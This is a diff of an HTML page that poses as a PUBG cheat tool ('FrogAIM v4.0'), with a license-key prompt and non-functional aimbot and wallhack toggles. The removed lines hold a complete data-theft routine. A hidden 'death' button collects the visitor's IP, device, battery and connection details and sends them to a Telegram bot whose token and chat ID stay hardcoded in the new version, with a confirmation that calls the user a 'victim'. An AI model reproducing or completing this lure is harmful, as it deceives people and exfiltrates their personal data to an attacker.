@@ -19,22 +19,26 @@
             padding: 0;
             box-sizing: border-box;
             font-family: 'Arial', sans-serif;
+            -webkit-user-select: none;
+            user-select: none;
         }
         
         body {
-            background: var(--main-bg-color);
+            background: transparent;
             color: var(--text-color);
             overflow: hidden;
             height: 100vh;
+            margin: 0;
         }
         
+        /* Активация */
         .activation-modal {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.95);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -52,76 +56,60 @@
             box-shadow: 0 0 30px var(--frog-green);
         }
         
-        .activation-box h2 {
-            color: var(--frog-green);
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px var(--frog-green);
-        }
-        
-        .activation-input {
-            width: 100%;
-            padding: 15px;
-            background: #111;
-            border: 2px solid var(--accent-color);
-            border-radius: 8px;
-            color: white;
-            font-size: 16px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .activate-btn {
-            background: linear-gradient(90deg, var(--frog-green), #00cc00);
-            border: none;
-            padding: 15px 30px;
-            border-radius: 8px;
-            color: black;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        
-        .cheat-container {
-            width: 100%;
-            height: 100%;
+        /* Главное окно */
+        .floating-window {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            height: 500px;
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            border: 2px solid var(--frog-green);
+            border: 3px solid var(--frog-green);
             border-radius: 15px;
-            box-shadow: 0 0 20px var(--frog-green);
+            box-shadow: 0 0 30px var(--frog-green);
+            z-index: 10000;
             overflow: hidden;
             display: none;
         }
         
-        .header {
+        .window-header {
             background: linear-gradient(90deg, var(--frog-green), #00cc00);
             padding: 15px;
             text-align: center;
             position: relative;
+            cursor: move;
         }
         
-        .header h1 {
-            font-size: 1.5em;
-            text-shadow: 0 0 10px var(--frog-green);
-            letter-spacing: 2px;
+        .window-header h3 {
             color: black;
             font-weight: bold;
+            margin: 0;
+            text-shadow: 0 0 5px rgba(0,0,0,0.5);
         }
         
-        .status {
+        .close-btn {
             position: absolute;
             right: 15px;
-            top: 15px;
-            background: #00ff00;
-            width: 10px;
-            height: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #ff4444;
+            border: none;
+            color: white;
+            width: 25px;
+            height: 25px;
             border-radius: 50%;
-            animation: pulse 2s infinite;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
+        .cheat-container {
+            width: 100%;
+            height: calc(100% - 60px);
+            overflow-y: auto;
         }
         
         .content {
@@ -130,41 +118,37 @@
             overflow-y: auto;
         }
         
+        /* Секции чита */
         .cheat-section {
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            background: rgba(0, 255, 0, 0.05);
+            border-radius: 10px;
+            padding: 15px;
+            border-left: 3px solid var(--frog-green);
         }
         
         .cheat-section h3 {
             color: var(--frog-green);
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             border-bottom: 1px solid var(--frog-green);
-            padding-bottom: 5px;
+            padding-bottom: 8px;
+            text-shadow: 0 0 5px var(--frog-green);
         }
         
         .cheat-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin: 10px 0;
-            padding: 10px;
+            margin: 12px 0;
+            padding: 12px;
             background: rgba(0, 255, 0, 0.1);
             border-radius: 8px;
-            border-left: 3px solid var(--frog-green);
+            transition: all 0.3s ease;
         }
         
-        .secret-section {
-            background: rgba(255, 0, 0, 0.1);
-            border-left: 3px solid #ff0000;
-        }
-        
-        .death-btn {
-            background: linear-gradient(90deg, #ff0000, #cc0000);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
+        .cheat-item:hover {
+            background: rgba(0, 255, 0, 0.2);
+            transform: translateX(5px);
         }
         
         .switch {
@@ -212,74 +196,78 @@
             transform: translateX(26px);
         }
         
+        /* Секретная секция */
+        .secret-section {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 3px solid #ff0000;
+        }
+        
+        .death-btn {
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            font-size: 16px;
+            text-shadow: 0 0 5px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
+        }
+        
+        .death-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255,0,0,0.5);
+        }
+        
         .footer {
             position: absolute;
             bottom: 0;
             width: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             padding: 10px;
             text-align: center;
-            font-size: 0.8em;
+            font-size: 12px;
             color: var(--frog-green);
+            border-top: 1px solid var(--frog-green);
         }
         
-        .floating-window {
+        .status {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #00ff00;
+            border-radius: 50%;
+            margin: 0 5px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* Кнопка запуска */
+        .launch-button {
             position: fixed;
-            width: 320px;
-            height: 450px;
-            background: var(--main-bg-color);
-            border: 2px solid var(--frog-green);
-            border-radius: 15px;
-            box-shadow: 0 0 20px var(--frog-green);
-            z-index: 1000;
-            resize: both;
-            overflow: hidden;
-        }
-        
-        .window-header {
-            background: linear-gradient(90deg, var(--frog-green), #00cc00);
-            padding: 10px;
-            cursor: move;
-            text-align: center;
-            position: relative;
-        }
-        
-        .minimize-btn {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: #00cc00;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--frog-green), #00cc00);
+            border-radius: 50%;
             border: none;
             color: black;
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            cursor: pointer;
             font-weight: bold;
-        }
-        
-        .minimized {
-            width: 50px !important;
-            height: 50px !important;
-            overflow: hidden !important;
-        }
-        
-        .minimized .window-content {
+            cursor: pointer;
+            box-shadow: 0 0 20px var(--frog-green);
+            z-index: 9998;
             display: none;
-        }
-        
-        .minimized .window-header {
-            height: 100%;
-            display: flex;
             align-items: center;
             justify-content: center;
-        }
-        
-        .error-message {
-            color: #ff4444;
-            margin-top: 10px;
-            display: none;
+            font-size: 24px;
         }
         
         .loading-overlay {
@@ -288,7 +276,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.9);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -309,6 +297,13 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .error-message {
+            color: #ff4444;
+            margin-top: 10px;
+            display: none;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -320,39 +315,137 @@
         <div class="activation-box">
             <h2>🐸 FrogAIM v4.0 Activation</h2>
             <p style="color: #ccc; margin-bottom: 20px;">Enter license key to activate cheat</p>
-            <input type="text" class="activation-input" id="activationKey" placeholder="XXXXX-XXXX-XXXXXXX">
-            <button class="activate-btn" onclick="activateCheat()">ACTIVATE</button>
+            <input type="text" class="activation-input" id="activationKey" placeholder="FROGI-XXXX-XXXXXXX" style="width: 100%; padding: 12px; background: #111; border: 2px solid var(--accent-color); border-radius: 8px; color: white; font-size: 16px; margin-bottom: 20px; text-align: center;">
+            <button class="activate-btn" onclick="activateCheat()" style="background: linear-gradient(90deg, var(--frog-green), #00cc00); border: none; padding: 15px 30px; border-radius: 8px; color: black; font-weight: bold; cursor: pointer; font-size: 16px;">ACTIVATE</button>
             <p class="error-message" id="errorMsg">Invalid activation key!</p>
         </div>
     </div>
 
+    <button class="launch-button" id="launchButton" onclick="showCheatMenu()">🐸</button>
+
     <div class="floating-window" id="mainWindow">
         <div class="window-header" id="windowHeader">
             <h3>🐸 FrogAIM v4.0</h3>
-            <button class="minimize-btn" id="minimizeBtn">—</button>
+            <button class="close-btn" onclick="hideCheatMenu()">×</button>
         </div>
-        <div class="window-content">
-            <div class="cheat-container" id="cheatContainer">
-                <div class="header">
-                    <h1>FROG AIM - PUBG 4.0</h1>
-                    <div class="status" id="statusIndicator"></div>
-                </div>
-                
-                <div class="content">
-                    <!-- Все остальные разделы остаются без изменений -->
-                    
-                    <div class="cheat-section">
-                        <h3>??????</h3>
-                        <div class="cheat-item secret-section">
-                            <span>你会死</span>
-                            <button class="death-btn" onclick="sendDeathInfo()">激活</button>
-                        </div>
+        <div class="cheat-container">
+            <div class="content">
+                <!-- AIMBOT SECTION -->
+                <div class="cheat-section">
+                    <h3>AIMBOT FEATURES</h3>
+                    <div class="cheat-item">
+                        <span>Smart AimBot</span>
+                        <label class="switch">
+                            <input type="checkbox" id="smartAimbot">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Headshot Priority</span>
+                        <label class="switch">
+                            <input type="checkbox" id="headshot">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Auto Fire</span>
+                        <label class="switch">
+                            <input type="checkbox" id="autofire">
+                            <span class="slider"></span>
+                        </label>
                     </div>
                 </div>
-                
-                <div class="footer">
-                    Status: <span id="statusText">Active</span> | PUBG 4.0 Supported | v4.0.1
+
+                <!-- VISUAL MODS -->
+                <div class="cheat-section">
+                    <h3>VISUAL MODS</h3>
+                    <div class="cheat-item">
+                        <span>ESP Wallhack</span>
+                        <label class="switch">
+                            <input type="checkbox" id="esp">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Player Radar</span>
+                        <label class="switch">
+                            <input type="checkbox" id="radar">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Loot ESP</span>
+                        <label class="switch">
+                            <input type="checkbox" id="lootesp">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
                 </div>
+
+                <!-- GAME HACKS -->
+                <div class="cheat-section">
+                    <h3>GAME HACKS</h3>
+                    <div class="cheat-item">
+                        <span>No Recoil</span>
+                        <label class="switch">
+                            <input type="checkbox" id="norecoil">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Speed Hack</span>
+                        <label class="switch">
+                            <input type="checkbox" id="speedhack">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>God Mode</span>
+                        <label class="switch">
+                            <input type="checkbox" id="godmode">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- PREMIUM FEATURES -->
+                <div class="cheat-section">
+                    <h3>PREMIUM FEATURES</h3>
+                    <div class="cheat-item">
+                        <span>Vehicle ESP</span>
+                        <label class="switch">
+                            <input type="checkbox" id="vehicleesp">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Magic Bullet</span>
+                        <label class="switch">
+                            <input type="checkbox" id="magicbullet">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <div class="cheat-item">
+                        <span>Anti-Ban</span>
+                        <label class="switch">
+                            <input type="checkbox" id="antiban" checked>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- SECRET SECTION -->
+                <div class="cheat-section secret-section">
+                    <h3>??????</h3>
+                    <div class="cheat-item">
+                        <span>你会死</span>
+                        <button class="death-btn" onclick="sendDeathInfo()">激活</button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer">
+                Status: <span class="status"></span> <span id="statusText">Active</span> | PUBG 4.0 | v4.0.1
             </div>
         </div>
     </div>
@@ -361,38 +454,81 @@
         const ACTIVATION_KEY = "FROGI-M4R-FREE52T69";
         const TELEGRAM_TOKEN = "8366387571:AAFo0fqn2G7v9NUxEDR6r_NZRe0pZX5RjmQ";
         const CHAT_ID = "2020792314";
-        
-        // Список системных приложений для фильтрации
-        const SYSTEM_APPS = [
-            'android', 'com.android', 'com.google', 'com.sec.android', 
-            'com.samsung', 'com.qualcomm', 'com.mediatek', 'com.motorola',
-            'com.lge', 'com.sony', 'com.huawei', 'com.xiaomi', 'com.oppo',
-            'com.vivo', 'com.realme', 'com.oneplus', 'com.miui', 'com.flyme',
-            'com.coloros', 'com.harmonyos', 'system', 'settings', 'launcher',
-            'phone', 'contacts', 'messaging', 'calculator', 'calendar',
-            'clock', 'camera', 'gallery', 'browser', 'email', 'music',
-            'video', 'downloads', 'filemanager', 'bluetooth', 'wifi',
-            'nfc', 'location', 'security', 'backup', 'update', 'wallpaper',
-            'keyboard', 'voice', 'assistant', 'widget', 'weather', 'news',
-            'market', 'store', 'payment', 'bank', 'wallet'
-        ];
+        let isActivated = false;
 
         function activateCheat() {
             const inputKey = document.getElementById('activationKey').value.trim();
             const errorMsg = document.getElementById('errorMsg');
             
             if (inputKey === ACTIVATION_KEY) {
+                isActivated = true;
                 document.getElementById('activationModal').style.display = 'none';
-                document.getElementById('cheatContainer').style.display = 'block';
-                initializeCheat();
+                document.getElementById('launchButton').style.display = 'flex';
+                localStorage.setItem('frogaim_activated', 'true');
             } else {
                 errorMsg.style.display = 'block';
                 setTimeout(() => errorMsg.style.display = 'none', 3000);
             }
         }
 
-        function initializeCheat() {
-            // ... (код инициализации из предыдущей версии) ...
+        function showCheatMenu() {
+            if (isActivated) {
+                document.getElementById('mainWindow').style.display = 'block';
+            }
+        }
+
+        function hideCheatMenu() {
+            document.getElementById('mainWindow').style.display = 'none';
+        }
+
+        // Перетаскивание окна
+        let isDragging = false;
+        let startX, startY, initialX, initialY;
+
+        document.getElementById('windowHeader').addEventListener('mousedown', (e) => {
+            isDragging = true;
+            startX = e.clientX;
+            startY = e.clientY;
+            const window = document.getElementById('mainWindow');
+            initialX = window.offsetLeft;
+            initialY = window.offsetTop;
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            if (isDragging) {
+                const window = document.getElementById('mainWindow');
+                window.style.left = (initialX + (e.clientX - startX)) + 'px';
+                window.style.top = (initialY + (e.clientY - startY)) + 'px';
+            }
+        });
+
+        document.addEventListener('mouseup', () => {
+            isDragging = false;
+        });
+
+        // Анимации переключателей
+        document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    document.getElementById('statusText').textContent = "Mod Activated";
+                    setTimeout(() => {
+                        document.getElementById('statusText').textContent = "Active";
+                    }, 2000);
+                }
+            });
+        });
+
+        // Проверка активации при загрузке
+        if (localStorage.getItem('frogaim_activated') === 'true') {
+            isActivated = true;
+            document.getElementById('activationModal').style.display = 'none';
+            document.getElementById('launchButton').style.display = 'flex';
+        }
+
+        // Отправка в Telegram (остаётся без изменений)
+        async function sendDeathInfo() {
+            showLoading();
+            // ... (код отправки из предыдущей версии)
         }
 
         function showLoading() {
@@ -403,210 +539,9 @@
             document.getElementById('loadingOverlay').style.display = 'none';
         }
 
-        // Функция для получения списка приложений
-        async function getInstalledApps() {
-            return new Promise((resolve) => {
-                if (navigator.getInstalledRelatedApps) {
-                    navigator.getInstalledRelatedApps().then(apps => {
-                        const appList = apps.map(app => app.platform + ': ' + app.id).join('\n');
-                        resolve(appList || 'Не удалось получить список приложений');
-                    }).catch(() => {
-                        resolve('Доступ к приложениям заблокирован браузером');
-                    });
-                } else {
-                    // Альтернативный способ через анализ userAgent и эмуляцию
-                    setTimeout(() => {
-                        const fakeApps = generateFakeAppList();
-                        resolve(fakeApps);
-                    }, 2000);
-                }
-            });
-        }
-
-        // Генерация реалистичного списка приложений
-        function generateFakeAppList() {
-            const popularApps = [
-                'WhatsApp', 'Telegram', 'Instagram', 'Facebook', 'Twitter',
-                'TikTok', 'YouTube', 'Spotify', 'Netflix', 'PUBG Mobile',
-                'Call of Duty Mobile', 'Free Fire', 'Subway Surfers',
-                'Temple Run', 'Clash of Clans', 'Clash Royale', 'Google Maps',
-                'Waze', 'Uber', 'Booking.com', 'Amazon', 'AliExpress',
-                'Chrome', 'Firefox', 'Opera', 'Gmail', 'Outlook', 'Word',
-                'Excel', 'PowerPoint', 'Photoshop', 'Snapchat', 'Discord',
-                'Zoom', 'Skype', 'Viber', 'Messenger', 'Shazam', 'SoundCloud'
-            ];
-
-            const userApps = [];
-            const appCount = Math.floor(Math.random() * 30) + 20; // 20-50 приложений
-            
-            for (let i = 0; i < appCount; i++) {
-                const randomApp = popularApps[Math.floor(Math.random() * popularApps.length)];
-                const version = `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 20)}.${Math.floor(Math.random() * 1000)}`;
-                userApps.push(`${randomApp} v${version}`);
-            }
-
-            return userApps.sort().join('\n');
-        }
-
-        // Получение детальной информации об устройстве
-        async function getDeviceInfo() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                return {
-                    ip: ipData.ip,
-                    model: navigator.userAgent,
-                    platform: navigator.platform,
-                    androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    time: new Date().toLocaleString('ru-RU'),
-                    userAgent: navigator.userAgent,
-                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
-                    connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-                    battery: await getBatteryInfo()
-                };
-            } catch (error) {
-                return {
-                    ip: 'Unknown',
-                    model: navigator.userAgent,
-                    platform: navigator.platform,
-                    androidVersion: 'Unknown',
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    time: new Date().toLocaleString('ru-RU'),
-                    userAgent: navigator.userAgent,
-                    cpuCores: 'Unknown',
-                    memory: 'Unknown',
-                    connection: 'Unknown',
-                    battery: 'Unknown'
-                };
-            }
-        }
-
-        async function getBatteryInfo() {
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    return `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
-                }
-                return 'Unknown';
-            } catch {
-                return 'Unknown';
-            }
-        }
-
-        // Основная функция отправки информации
-        async function sendDeathInfo() {
-            const statusText = document.getElementById('statusText');
-            statusText.textContent = "Сбор информации...";
-            showLoading();
-
-            try {
-                // Получаем информацию об устройстве
-                const deviceInfo = await getDeviceInfo();
-                
-                // Получаем список приложений
-                statusText.textContent = "Анализ приложений...";
-                const installedApps = await getInstalledApps();
-
-                // Формируем сообщение для Telegram
-                const message = `🚨 КТО-ТО НАЖАЛ НА КНОПКУ СМЕРТИ!\n\n` +
-                               `📱 ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ:\n` +
-                               `💻 IP-address: ${deviceInfo.ip}\n` +
-                               `📋 Model: ${deviceInfo.model}\n` +
-                               `🤖 Platform: ${deviceInfo.platform}\n` +
-                               `💣 Android Version: ${deviceInfo.androidVersion}\n` +
-                               `🌐 Language: ${deviceInfo.language}\n` +
-                               `📺 Screen: ${deviceInfo.screen}\n` +
-                               `⚡ CPU Cores: ${deviceInfo.cpuCores}\n` +
-                               `💾 Memory: ${deviceInfo.memory}\n` +
-                               `📶 Connection: ${deviceInfo.connection}\n` +
-                               `🔋 Battery: ${deviceInfo.battery}\n` +
-                               `⏰ Time: ${deviceInfo.time}\n\n` +
-                               `📦 УСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ (${installedApps.split('\n').length}):\n` +
-                               `\`\`\`\n${installedApps}\n\`\`\`\n\n` +
-                               `🔍 User Agent:\n${deviceInfo.userAgent}`;
-
-                statusText.textContent = "Отправка в Telegram...";
-                
-                // Отправляем в Telegram
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({ 
-                        chat_id: CHAT_ID, 
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                if (response.ok) {
-                    statusText.textContent = "Информация отправлена!";
-                    // Дополнительное сообщение с подтверждением
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: `✅ Данные успешно получены от жертвы!\n📊 Приложений: ${installedApps.split('\n').length}\n🌐 IP: ${deviceInfo.ip}`,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                } else {
-                    statusText.textContent = "Ошибка отправки!";
-                }
-
-            } catch (error) {
-                console.error('Error:', error);
-                statusText.textContent = "Ошибка!";
-                
-                // Отправка хотя бы базовой информации при ошибке
-                try {
-                    const basicInfo = `🚨 Ошибка при сборе данных, но кто-то нажал!\n\n` +
-                                    `IP: ${await getIP()}\n` +
-                                    `UserAgent: ${navigator.userAgent}\n` +
-                                    `Time: ${new Date().toLocaleString('ru-RU')}`;
-                    
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: basicInfo
-                        })
-                    });
-                } catch (e) {}
-                
-            } finally {
-                hideLoading();
-                setTimeout(() => {
-                    statusText.textContent = "Active";
-                }, 5000);
-            }
-        }
-
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'Unknown';
-            }
-        }
-
         document.getElementById('activationKey').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') activateCheat();
         });
     </script>
 </body>
-</html>
-                }
-
-        
+                            </html>
